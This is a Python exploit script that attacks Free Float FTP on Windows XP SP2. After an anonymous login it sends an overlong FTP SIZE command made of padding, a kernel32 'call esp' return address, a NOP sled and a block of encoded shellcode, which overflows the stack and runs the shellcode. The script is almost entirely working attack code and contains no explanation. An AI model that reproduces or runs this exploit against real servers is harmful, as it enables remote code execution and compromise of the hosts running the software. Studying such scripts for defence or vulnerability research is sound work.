#AleeAmini
#Software: Free Float FTP
#Microsoft Windows XP SP2 x86 Oct.2007


#!/usr/bin/python

import socket
import sys
import time

#ESP	258
#EIP	246
shellcode="\x31\xC0\x50\x68\x42\x45\x45\x46\x89\xE3\x50\x68\x75\x79\x73\x21\x68\x48\x69\x20\x47\x89\xE1\x50\x53\x51\x50\xBB\x04\x07\x45\x7E\xFF\xD3"
buf =  ""
buf += "\xd9\xc5\xb8\xde\xfa\xbe\x1f\xd9\x74\x24\xf4\x5b\x29"
buf += "\xc9\xb1\x52\x31\x43\x17\x83\xeb\xfc\x03\x9d\xe9\x5c"
buf += "\xea\xdd\xe6\x23\x15\x1d\xf7\x43\x9f\xf8\xc6\x43\xfb"
buf += "\x89\x79\x74\x8f\xdf\x75\xff\xdd\xcb\x0e\x8d\xc9\xfc"
buf += "\xa7\x38\x2c\x33\x37\x10\x0c\x52\xbb\x6b\x41\xb4\x82"
buf += "\xa3\x94\xb5\xc3\xde\x55\xe7\x9c\x95\xc8\x17\xa8\xe0"
buf += "\xd0\x9c\xe2\xe5\x50\x41\xb2\x04\x70\xd4\xc8\x5e\x52"
buf += "\xd7\x1d\xeb\xdb\xcf\x42\xd6\x92\x64\xb0\xac\x24\xac"
buf += "\x88\x4d\x8a\x91\x24\xbc\xd2\xd6\x83\x5f\xa1\x2e\xf0"
buf += "\xe2\xb2\xf5\x8a\x38\x36\xed\x2d\xca\xe0\xc9\xcc\x1f"
buf += "\x76\x9a\xc3\xd4\xfc\xc4\xc7\xeb\xd1\x7f\xf3\x60\xd4"
buf += "\xaf\x75\x32\xf3\x6b\xdd\xe0\x9a\x2a\xbb\x47\xa2\x2c"
buf += "\x64\x37\x06\x27\x89\x2c\x3b\x6a\xc6\x81\x76\x94\x16"
buf += "\x8e\x01\xe7\x24\x11\xba\x6f\x05\xda\x64\x68\x6a\xf1"
buf += "\xd1\xe6\x95\xfa\x21\x2f\x52\xae\x71\x47\x73\xcf\x19"
buf += "\x97\x7c\x1a\x8d\xc7\xd2\xf5\x6e\xb7\x92\xa5\x06\xdd"
buf += "\x1c\x99\x37\xde\xf6\xb2\xd2\x25\x91\x7c\x8a\xad\xe3"
buf += "\x15\xc9\xad\xc1\x5d\x44\x4b\x6f\x8e\x01\xc4\x18\x37"
buf += "\x08\x9e\xb9\xb8\x86\xdb\xfa\x33\x25\x1c\xb4\xb3\x40"
buf += "\x0e\x21\x34\x1f\x6c\xe4\x4b\xb5\x18\x6a\xd9\x52\xd8"
buf += "\xe5\xc2\xcc\x8f\xa2\x35\x05\x45\x5f\x6f\xbf\x7b\xa2"
buf += "\xe9\xf8\x3f\x79\xca\x07\xbe\x0c\x76\x2c\xd0\xc8\x77"
buf += "\x68\x84\x84\x21\x26\x72\x63\x98\x88\x2c\x3d\x77\x43"
buf += "\xb8\xb8\xbb\x54\xbe\xc4\x91\x22\x5e\x74\x4c\x73\x61"
buf += "\xb9\x18\x73\x1a\xa7\xb8\x7c\xf1\x63\xc8\x36\x5b\xc5"
buf += "\x41\x9f\x0e\x57\x0c\x20\xe5\x94\x29\xa3\x0f\x65\xce"
buf += "\xbb\x7a\x60\x8a\x7b\x97\x18\x83\xe9\x97\x8f\xa4\x3b"
sc_size=34


try:
    	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    	connect = s.connect(('192.168.136.129',21))
    	s.recv(1024)
	s.send('USER anonymous\n')

	s.recv(1024)
	s.send('PASS anonymous\n')
	s.recv(1024)

	payload="A"*246+"\x68\xd5\x85\x7c"+"\x90"*16+buf	#call esp kerenl32.dll 0x7C85D568

	sample="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"
	s.send('SIZE '+ payload + '\n')
	print s.recv(1024)

except:
	print "Connection Error."
	s.close()
